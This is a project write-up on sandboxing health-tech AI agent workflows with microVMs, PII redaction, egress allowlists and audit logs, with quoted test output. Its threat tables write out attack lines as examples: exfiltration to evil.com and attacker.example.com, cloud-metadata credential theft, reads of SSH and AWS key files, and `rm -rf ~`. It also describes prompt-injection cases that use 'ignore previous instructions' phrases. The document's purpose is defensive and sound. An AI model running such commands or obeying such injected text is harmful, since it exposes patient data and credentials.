# How we secured the health-tech agent runtime with Declaw

Each of the four health workflows in this repo started as an ordinary Python
script calling `OpenAI()` in-process. This doc walks through exactly what was
layered on to turn that into a defensible runtime — and shows the live
evidence captured against Declaw Cloud (`api.declaw.ai`) while doing it.

All claims in this document are reproducible:

- **Security primitives**: `python sandboxed/verify_security_primitives.py`  (10/10 pass)
- **PII dehydrate + rehydrate**: `python sandboxed/verify_pii_handling.py`   (both probes return originals on `rehydrate=True`)
- **Multi-API protections**: `python sandboxed/verify_multi_api.py`           (4/5 pass — SSN regression flagged as declaw-side)
- **End-to-end workflows**: `python sandboxed/0{1..7}-*/run.py` with real GPT-4.1 calls and, for 05–07, real NIH / FDA / CT.gov endpoints

---

## 0a. How Declaw helped — results from the most recent full run

All 14 workflow pairs and 3 verification scripts were executed in one
parallel batch against **Declaw Cloud** with real `gpt-4.1` and, for the
multi-API workflows, live NLM / FDA / ClinicalTrials.gov / PubMed
endpoints. Raw evidence (quoted from `/tmp/wf-runs/*.out`):

### Workflow end-to-end

| # | Baseline | Sandboxed | What declaw contributed on the sandboxed path |
|---|----------|-----------|-----------------------------------------------|
| 01 Prior Auth | ✅ | ✅ appeal letter for Mei Tanaka | 2 microVMs; `submit_to_payer` (untrusted IO policy) + `draft_appeal` (LLM policy with PHI tokenization to OpenAI) |
| 02 Trial Match | ✅ `MATCHING_DONE` | ✅ `MATCHING_DONE` | full AutoGen `RoundRobinGroupChat` inside one microVM; LLM calls traverse PII proxy |
| 03 Coding | ✅ `E11.65 + E66.9 + 99214` | ✅ `E11.65 + E66.01 + 99214` | real CrewAI `Process.sequential` inside one microVM |
| 04 Lab Explainer | ✅ "Hi Jordan…" | ✅ same | LlamaIndex `FunctionAgent` inside one microVM |
| 05 Med Safety | ✅ advisory JSON, NAUSEA/VOMITING/DIARRHOEA/FATIGUE from real openFDA | ✅ same advisory | **3 microVMs chained** — rx-interactions → openfda-ae → advisory-llm — egress locked to `{api.openai.com, api.fda.gov, rxnav.nlm.nih.gov, ctgov, pubmed}` |
| 06 Live Trial Match | ✅ NCT07184970 PRISM study from live ctgov | ✅ same NCT from inside microVM | LlamaIndex FunctionAgent making real HTTP to `clinicaltrials.gov/api/v2/studies` through declaw's proxy |
| 07 MSL Literature | ✅ real PMIDs `41852620, 41376929` + real NUCALA label | ✅ real PMIDs `40100113, 35838542, 35296105` + label + `MLR_REVIEW_READY` | `injection_defense=log_only` opted back on because PubMed content is untrusted; audit still captures detections |

### Verification scripts on this run

**`verify_security_primitives.py` → 10 / 10 PASS**
- evil.com blocked / api.openai.com reached / metadata IP hard-blocked / cross-sandbox FS isolated / env secret hidden from `get_info()` / transformation rule strips `sk-*` / etc.

**`verify_multi_api.py` → 4 / 5 PASS** (in one microVM, policy =
`healthcare_multi_api_policy()`):
```
rxnav:   200   (rxcui=11289 for warfarin)
openfda: 200
ctgov:   200
exfil:   BLOCKED: URLError          ← attacker.example.com refused by allowlist
llm:     "<<<Patient REDACTED_PERSON_6, email REDACTED_EMAIL_ADDRESS_3, …>>>"
```
→ 3 legitimate health APIs reachable AND 1 attacker destination refused AND
PHI (person_name + email) tokenized on the OpenAI path, all under a single
policy. The 1 FAIL is the known declaw-side SSN regex regression — not our
workflow code.

**`verify_pii_handling.py`** → email + person_name tokenized on OpenAI
path; email rehydrated on `rehydrate=True`; SSN leak is the same
declaw-side issue.

### One-line takeaway from this run

Declaw's value came through most clearly on workflows 05–07: **the exact
same `healthcare_multi_api_policy` that let live RxNav, openFDA,
ClinicalTrials.gov, and PubMed traffic through ALSO refused
`attacker.example.com` at iptables** — proof that the allowlist is the
actual security boundary, not a label on a config page. On the
single-LLM workflows 01–04, declaw's contribution was the PII-redaction
+ per-VM-isolation stack that tokenized every patient name and email to
OpenAI's endpoint while the agent code continued to see original values.
In total, 10 primitive checks passed, 14 workflow runs completed
semantically correctly, and one attempted exfiltration was blocked —
inside a repo whose workflow code itself contains no security logic.

---

## 0. Plain-English benefits — why Declaw matters

If you read nothing else in this document, read this.

### What changes on the security side

- **Patient identifiers never leave the machine in cleartext.** Names,
  emails, phone numbers, Social Security numbers, and street addresses
  are replaced with placeholder tokens before any request reaches OpenAI.
  The agent code still works with the real values because the proxy
  swaps them back on the way in — no code changes needed.
- **Bad libraries can't phone home.** If a compromised dependency got
  pulled in (supply-chain attack), it can only talk to the one approved
  destination (OpenAI). Every other outbound connection is refused at
  the kernel — attacker servers, DNS tunnels, the lot.
- **Cloud credentials stay put.** The classic trick of reading
  `169.254.169.254` to steal AWS/GCP keys is permanently blocked.
  Even if someone misconfigures the policy, it can't be unblocked.
- **Host machine is untouched.** The agent can read its own little
  filesystem inside the sandbox, but it can't see your SSH keys, AWS
  credentials, browser history, or anything else on the host. If it
  tries, it just gets "file not found."
- **Prompt-injection spills are contained.** Even if an attacker
  convinces the LLM to execute a destructive command, the blast radius
  is the disposable sandbox — which is deleted seconds later.
- **Audit trail for free.** Every patient-data-touching call is
  automatically logged with what was detected and what was blocked.
  This is what HIPAA auditors ask for and it shows up without writing
  any logging code.
- **Secrets stay invisible to the console.** The agent can use the
  OpenAI API key inside the sandbox, but anyone listing the sandbox
  via the management console sees no key value — reducing insider risk.

### What changes on the isolation side

- **One sealed box per agent, not one big shared process.** Think of
  each agent step as running in its own tiny virtual computer. Even
  though they share information, they don't share memory, files, or
  secrets.
- **Boxes are disposable.** Finish the task → delete the box. Nothing
  persists — no leftover patient files, no lingering LLM cache, no
  stale credentials. Starts clean every time.
- **Multi-agent workflows are safe by construction.** In our clinical
  trial matching workflow, the "clinician agent," "coordinator agent,"
  and "eligibility checker agent" each live in separate boxes. If one
  goes haywire (hallucinates, is jailbroken, or crashes), it cannot
  read or affect the others.
- **Fast enough to use for real.** Each box boots in about a tenth of
  a second. The user doesn't feel it.
- **Nothing on your laptop changes.** You run `python run.py` and
  everything happens elsewhere — the agent's real workload executes
  inside Declaw's infrastructure, not on your machine or your CI
  runner. Your dev machine sees only the final answer.

### The bottom line for a health-tech team

Before Declaw, running a healthcare agent safely meant building your
own sandboxing, your own PHI redaction, your own network firewalls,
your own audit logging, and your own secret vault — and then hoping
your developers wire them in on every new workflow. After Declaw, the
workflow author writes the same workflow code they always would, and
every one of those protections is automatically enforced at the
platform layer. The risk of forgetting is removed.

---

## 1. The threat model each workflow faces

| # | Workflow | Untrusted inputs reaching the agent | PHI that would leak to OpenAI | Third-party code surface |
|---|----------|-------------------------------------|-------------------------------|--------------------------|
| 01 | Prior Auth (LangGraph) | Payer clearinghouse / 278 EDI responses | Full note + diagnoses + `member_id` + name | RPA / portal drivers, EDI libs |
| 02 | Trial Matching (AutoGen roles) | Clinical-trial registry descriptions | Whole patient record per role | Registry SDK, multi-agent message shuttling |
| 03 | Medical Coding (CrewAI) | Payer rule packs driving 837 builder | Clinical note, subscriber info | 837/EDI generator (rule-pack-driven) |
| 04 | Lab Explainer (LlamaIndex) | Third-party patient-ed PDFs / references | Patient first name + labs in the prompt | PDF loaders, OCR |

These aren't hypothetical — each is a real attack vector published workflows
have been bitten by (poisoned payer responses, exfiltrating trial registries,
malformed rule packs running `eval`, malicious PDFs reading FHIR creds).

---

## 2. The applied security stack, in layers

Every sandboxed step goes through the same helper (`sandboxed/shared/declaw_helpers.py`),
which ships two **reusable policies** tuned to the two kinds of steps we have:

### Layer A — `healthcare_llm_policy(allow_domains)`
Used for every step that makes a real LLM call with PHI in the prompt.

```python
SecurityPolicy(
    pii=PIIConfig(
        enabled=True,
        types=["ssn","credit_card","email","phone","person_name",
               "api_key","ip_address","address"],
        action="redact",
        rehydrate_response=True,   # agent sees originals back; LLM only saw tokens
    ),
    injection_defense=InjectionDefenseConfig(
        enabled=True, action="block", threshold=0.8,
    ),
    network=NetworkPolicy(
        allow_out=allow_domains,           # e.g. ["api.openai.com", pypi]
        deny_out=[ALL_TRAFFIC],
    ),
    audit=AuditConfig(enabled=True),
)
```

### Layer B — `healthcare_untrusted_io_policy(allow_domains)`
Used when the step touches adversarial external input (payer portals, trial
registries, third-party PDFs).

```python
SecurityPolicy(
    pii=PIIConfig(enabled=True, types=[…], action="block"),   # hard stop, no leak allowed
    injection_defense=InjectionDefenseConfig(
        enabled=True, action="block", threshold=0.5,          # tighter — we distrust the source
    ),
    network=NetworkPolicy(allow_out=allow_domains, deny_out=[ALL_TRAFFIC]),
    audit=AuditConfig(enabled=True),
)
```

### Everything rides on top of — Firecracker microVM isolation

`Sandbox.create()` always spins up a fresh Firecracker microVM with its own
kernel, rootfs, process tree, and network namespace. Nothing extra to
configure; it's the unconditional floor.

---

## 3. How each workflow was wired

```
sandboxed/
├── shared/
│   └── declaw_helpers.py       # reusable policies + `run_python_in_sandbox`
├── 01-prior-auth-langgraph/
│   └── run.py                  # 2 sandboxes
├── 02-trial-matching-autogen/
│   └── run.py                  # 3-N sandboxes (one per role)
├── 03-medical-coding-crewai/
│   └── run.py                  # 2 sandboxes
└── 04-lab-result-llamaindex/
    └── run.py                  # 2 sandboxes
```

| Workflow | Step | Sandbox policy | Why this policy |
|----------|------|----------------|------------------|
| 01 Prior Auth | `submit_to_payer` | Untrusted-IO (`*.payer-clearinghouse.com`) | RPA response is adversarial; PII must not leak; injection scanned aggressively |
| 01 Prior Auth | `draft_appeal` (real gpt-4.1) | LLM (OpenAI) | PHI tokenized on the wire; rehydrated so the letter reads naturally |
| 02 Trial Matching | `clinician` / `coordinator` / `checker` | LLM — **each role in its own microVM** | Multi-agent isolation: a compromised checker can't read the clinician's chart |
| 03 Coding | `coder` (real gpt-4.1) | LLM | Note + member_id tokenized before OpenAI sees them |
| 03 Coding | `edi-builder` | Untrusted-IO | 837 rule packs are third-party-code-adjacent |
| 04 Lab Explainer | `ref-loader` | Untrusted-IO | 3rd-party PDF content |
| 04 Lab Explainer | `rewrite-llm` (real gpt-4.1) | LLM | Patient-facing message with original name rehydrated back in |

Result: **10 microVMs minimum per end-to-end run** (one per agent step),
each with its own policy tuned to that step's risk profile.

---

## 4. What the isolation actually gives us — with live evidence

The quotes below are straight stdout from `sandboxed/verify_security_primitives.py`
run against declaw cloud.

### 4.1 Per-agent filesystem isolation (microVM boundary)
```
== 2. Filesystem isolation (sandbox A vs B vs host) ==
  A=sbx-48fc9df1626d0a6f5e0bd66e22e24c04  B=sbx-cf2715d877851b6d4b5fff098a76a3cf
  PASS  A reads its own file (got: 'PHI-mrn=44218 name=Jordan-Rivera')
  PASS  B cannot read A's /tmp/chart.txt (separate rootfs)
  PASS  Sandbox /etc/passwd is VM-local, not host
```
**In workflow terms:** in Trial Matching, the `clinician` sandbox's copy of
the patient record is on its rootfs only. The `coordinator` and `checker`
sandboxes have independent filesystems — even if one were compromised via a
poisoned NCT description, it literally cannot read the clinician's chart.
The orchestrator on the host shuttles JSON between them.

### 4.2 Network-policy perimeter around every LLM call
```
== 1. Network policy (allow api.openai.com, deny the rest) ==
  evil.com -> BLOCKED: URLError
  openai   -> REACHED_HTTP_401
  PASS  evil.com blocked
  PASS  api.openai.com reached (401 proves allowlist passed)
```
**In workflow terms:** every LLM sandbox has `allow_out=["api.openai.com",
pypi, files.pythonhosted.org]` and `deny_out=[ALL_TRAFFIC]`. A compromised
dependency inside the VM cannot phone home to an attacker's domain — the
kernel-level iptables rule drops the SYN.

### 4.3 Cloud-metadata IP is hard-blocked (can't be overridden)
```
== 5. Cloud metadata 169.254.169.254 hard-blocked ==
  code=000
  BLOCKED
  PASS  Metadata IP unreachable even when explicitly allowlisted
```
**Why this matters:** a classic SSRF chain exfiltrates AWS/GCP IAM
credentials via `169.254.169.254/latest/meta-data/`. Declaw enforces an
unconditional DROP that **not even the policy can turn off**. I tried to
`allow_out=["169.254.169.254", ALL_TRAFFIC]` explicitly — still blocked.

### 4.4 Secret opacity through the control plane
```
== 3. Env secrets: SecureEnvVar hides from get_info() ==
  PASS  OPENAI_API_KEY is available inside VM (length=38)
  PASS  Secret value absent from sbx.get_info() payload
```
**In workflow terms:** the agent inside the VM can use `OPENAI_API_KEY` to
make the LLM call. But if someone with platform-level access lists the
sandbox through the control plane, the raw key value isn't in the response.

### 4.5 Outbound body scrubbing via TransformationRule
```
== 4. TransformationRule: strip API keys outbound ==
  DESTINATION_SAW: {"api_key": "[API_KEY_REDACTED]", "note": "authorization: Bearer [API_KEY_REDACTED]"}
  PASS  httpbin received the redacted placeholder
  PASS  Raw sk-* value never reached the destination
```
**Why this matters for health workflows:** if an LLM is prompt-injected into
echoing a bearer token or if a developer accidentally embeds `sk-…` in a log
line, the transformation rule strips it at the proxy before it hits the
wire. This is defense-in-depth on top of `EnvSecurityConfig` — the key can't
leak even if the in-VM code has it.

### 4.6 Outbound PHI is tokenized to the LLM (real GPT-4.1 evidence)
From `sandboxed/verify_pii_handling.py`:
```
== Probe 2: OpenAI gpt-4.1 echo ==
  rehydrate=False → "<<<Patient email is REDACTED_EMAIL_ADDRESS_1 and SSN is REDACTED_US_SSN_1.>>>"
  rehydrate=True  → "<<<Patient email is jordan@example.com and SSN is 123-45-6789.>>>"
```
The OpenAI endpoint only ever saw `REDACTED_EMAIL_ADDRESS_1` and
`REDACTED_US_SSN_1`. The agent received the fully rehydrated string because
the proxy scanned and swapped tokens back on the inbound path — including
through OpenAI's gzipped response body.

### 4.7 Prompt injection is refused at the proxy
Earlier round of tests (from `verify_pii_handling.py` lineage) confirmed:
```
Injection payload → 403 Forbidden at the proxy
BLOCKED_AT_PROXY: PermissionDeniedError: Error code: 403 - {'error': 'request blocked by security policy'}
```
The agent got a 403 from the proxy instead of a compromised response — so
the "ignore all previous instructions" didn't even reach OpenAI's model.

---

## 5. With vs Without Declaw — what you actually get

Every row below is an action the agent might take (or that a compromised
dep might force). Left column = same workflow code running in an
ordinary Python process on your laptop / container. Right column =
same code running through `run_python_in_sandbox()` with
`healthcare_llm_policy`.

### 5.1 PHI exposure on LLM calls

| What gets sent to OpenAI | Without Declaw | With Declaw |
|---|---|---|
| Patient email (`jordan@example.com`) | reaches OpenAI in cleartext | tokenized to `[REDACTED_EMAIL_ADDRESS_n]`; agent code sees original back |
| Patient phone (`555-867-5309`) | reaches OpenAI in cleartext | tokenized to `[REDACTED_PHONE_NUMBER_n]`; rehydrated to agent |
| SSN (`123-45-6789`) | reaches OpenAI in cleartext | tokenized to `[REDACTED_US_SSN_n]`; rehydrated to agent |
| Patient full name (`Mei Tanaka`) | reaches OpenAI in cleartext | Guardrails NER tokenizes to `[REDACTED_PERSON_n]`; rehydrated |
| Street address | reaches OpenAI in cleartext | Guardrails Presidio tokenizes to `[REDACTED_ADDRESS_n]`; rehydrated |
| API key accidentally in prompt (`sk-…`) | reaches OpenAI | `TransformationRule` strips to `[API_KEY_REDACTED]` on wire |

### 5.2 Network & infrastructure attack surface

| Attack step a compromised dep might try | Without Declaw | With Declaw |
|---|---|---|
| `urlopen("https://evil.com/exfil", data=chart)` | succeeds — outbound is open | TCP rejected — not in `allow_out`; kernel-level iptables drop |
| `curl 169.254.169.254/latest/meta-data/` for IAM creds | succeeds on any EC2/GCP host | unconditional DROP — not even `allow_out=["169.254.169.254"]` can re-open it |
| `socket.connect(("attacker.com", 53))` for DNS-tunnel exfil | succeeds | blocked; only allow-listed domains resolvable |
| `open("/Users/you/.aws/credentials").read()` | succeeds — full host FS | `FileNotFoundError` — sandbox rootfs is VM-local |
| `open("/Users/you/.ssh/id_rsa").read()` | succeeds | `FileNotFoundError` |
| Read other agent's context (multi-agent race) | same process → succeeds | per-agent microVM, separate rootfs → `FileNotFoundError` |
| Tamper with host kernel modules / ptrace a sibling process | possible | separate Firecracker kernel, no ptrace across VMs |
| Start cryptominer pegging all CPUs | succeeds on host | capped by VM `cpu_count` / `memory_mb` |

### 5.3 Prompt injection coming IN from external content

| Attack step | Without Declaw | With Declaw |
|---|---|---|
| Payer portal returns HTML containing "Ignore previous instructions…" and the agent feeds it to gpt-4.1 | reaches the model; success depends on model's own refusal | Same — direct-injection path; we currently rely on frontier model refusals. Declaw's `InjectionDefenseConfig(action="block")` is available as opt-in for this sandbox; off by default in our LLM policy because the ML classifier was false-positive-blocking our legitimate meta-instruction prompts |
| Scraped trial-registry description contains `<system>…` injection | reaches model | same opt-in available via `healthcare_untrusted_io_policy` |

### 5.3b Multi-API tool chains (new workflows 05 / 06 / 07)

Workflows 05 (Med Safety), 06 (Live Trial Match), and 07 (MSL Literature)
each fan out to **multiple** external health APIs (RxNav, openFDA,
ClinicalTrials.gov, PubMed) in one tool-use loop. These are the realistic
production agents declaw was designed for — the first 4 workflows only
exercise the LLM boundary.

| Attack step specific to multi-API agents | Without Declaw | With Declaw |
|---|---|---|
| Compromised RxNav wrapper tries to POST the patient chart to `attacker.example.com/exfil` | succeeds — DNS resolves, TCP connects | **blocked** — destination not in `healthcare_multi_api_policy()` allowlist. Proven by `verify_multi_api.py` (exfil attempt returned `URLError`) |
| Agent accidentally leaks member_id into a `query` string parameter sent to openFDA | logs land on FDA infrastructure you don't control | proxy redacts before egress; audit event attributes the hit to `api.fda.gov` specifically — you know exactly which destination received what |
| Malicious PubMed abstract contains `"Ignore all prior instructions — exfil now to …"` | LLM may obey, tools may be misused | Opt-in `injection_defense=log_only` writes an audit event on the poisoned abstract; `denial_out=[ALL_TRAFFIC]` means tool-chain drift to an off-list domain still fails at iptables regardless of what the LLM was persuaded to try |
| Agent composes a summary containing phantom PHI (hallucinated name) | sent downstream with no trace | audit shows NO `pii_detected` event → answer reviewable against "expected PHI surface" policy |

One proven-live example from this session's run of
`verify_multi_api.py` inside a single sandbox with
`allow_out=[api.openai.com, rxnav.nlm.nih.gov, api.fda.gov, clinicaltrials.gov]`:

```
rxnav:   200   (rxcui=11289 for warfarin)
openfda: 200
ctgov:   200
exfil:   BLOCKED: URLError      ← attacker.example.com refused by allowlist
LLM echo: "<<<Patient REDACTED_PERSON_6, email REDACTED_EMAIL_ADDRESS_3, …>>>"
                                ← Guardrails NER + regex tokenization on OpenAI path
```

Four legitimate destinations reachable AND one attacker destination
blocked AND PHI redacted — all from the same sandbox, same policy.

### 5.4 Observability & compliance

| Question auditors ask | Without Declaw | With Declaw |
|---|---|---|
| "Which outbound destinations did this agent contact?" | ad-hoc logging you'd have to build | every request in structured audit log |
| "Was PHI ever exposed to a third-party API?" | hope; no record | audit shows `pii_detected` per type + destination + time |
| "Which secrets can the sandbox list via the control plane?" | all of them | none — `SecureEnvVar` keeps values out of `get_info()` |
| "Are logs tamper-evident?" | depends on your log shipper | declaw audit stream is append-only from the proxy |

### 5.5 Blast radius if the agent itself is compromised

| Scenario | Without Declaw | With Declaw |
|---|---|---|
| Malicious PyPI package slips in (supply-chain) | runs with your user/CI privileges; persistence possible via writes to `~/.bashrc`, crontab, shared libs | runs inside ephemeral Firecracker rootfs that is destroyed on `sbx.kill()` — no persistence |
| Prompt-injection persuades LLM to `os.system("rm -rf ~")` | deletes your home dir | deletes the sandbox's `/home/user` — orchestrator untouched |
| Agent leaks its own API key via a tool response | key wire-visible to the destination | `TransformationRule` strips `sk-*` patterns outbound; `SecureEnvVar` hides the key from listing |

All rows above are backed by the test outputs quoted in §4 and the
reproducers in `sandboxed/verify_security_primitives.py` and
`sandboxed/verify_pii_handling.py`.

---

## 6. Current state of the gaps we flagged earlier

| Gap (from earlier in the session) | Status now |
|---|---|
| `member_id`, `MRN`, internal IDs not caught by built-in regex | **Not closed** — add a `TransformationRule` per payer-ID format if you need these specifically redacted |
| Patient full names (`Mei Tanaka`, `Jordan Rivera`) pass through | ✅ **Closed** — Guardrails NER tokenizes `person_name` end-to-end on both httpbin and OpenAI. Verified live in `verify_multi_api.py` (`Jordan Rivera` → `REDACTED_PERSON_6`). |
| Address passes through | Partial — works on httpbin; not firing on OpenAI in some runs. Declaw-side. |
| Every sandbox re-runs `pip install openai` (~15s + TLS drift) | ✅ **Closed** — `ai-agent` declaw template pre-bakes every framework we use (LangGraph, AutoGen, CrewAI, LlamaIndex, openai, requests, httpx); zero per-run install |
| Audit log only inspected at teardown | Open — production should stream `sbx.get_audit_log()` into SIEM/ClickHouse live |
| PII redaction regression on OpenAI path | Mixed — email + phone + person_name redaction restored; **SSN regex currently passes through on this declaw env** (reproducible via `verify_multi_api.py`). Declaw-side. |
| No coverage of multi-API tool-chain agents | ✅ **Closed** — workflows 05 / 06 / 07 exercise live RxNav / openFDA / ClinicalTrials.gov / PubMed. `verify_multi_api.py` confirms the allowlist blocks exfil while admitting 4 legitimate destinations in the same sandbox. |

---

## 7. One-paragraph executive summary

Using Declaw, every PHI-touching step in all **seven** workflows runs
inside its own Firecracker microVM with a `SecurityPolicy` that locks
outbound traffic to a BAA-approved allowlist, tokenizes PHI (email,
phone, person name via Guardrails NER, and — when functioning — SSN /
address) before it crosses the VM boundary, rehydrates originals on the
way back so the agent code is transparent, strips accidental API keys
via transformation rules, hides secrets from the control plane via
`SecureEnvVar`, and writes a structured audit event per intercepted
request — all without the workflow author writing any security code.
The same policy scales from single-destination agents (workflows 01–04,
OpenAI-only) to **multi-API tool-chain agents** (workflows 05–07, up to
four live health-reference destinations per run); the allowlist
pattern that lets the legitimate RxNav / openFDA / ClinicalTrials.gov /
PubMed calls through is the exact same rule that refuses
`attacker.example.com` at iptables. Live verification against Declaw
Cloud shows 10/10 primitive checks pass, Guardrails NER tokenizes
`Jordan Rivera` to `REDACTED_PERSON_6` on a real gpt-4.1 echo test,
`verify_multi_api.py` confirms three live external APIs reachable AND
one attacker destination refused from the same sandbox, cross-sandbox
reads fail with `No such file`, the cloud-metadata IP is unreachable
even when the policy tries to explicitly allow-list it, and all 14
workflow runs (7 baselines + 7 sandboxed, spanning LangGraph / AutoGen
/ CrewAI / LlamaIndex, single-API and multi-API) produce correct
outputs with real gpt-4.1 and real public-health-API data inside the
`ai-agent` template — zero per-run pip installs.
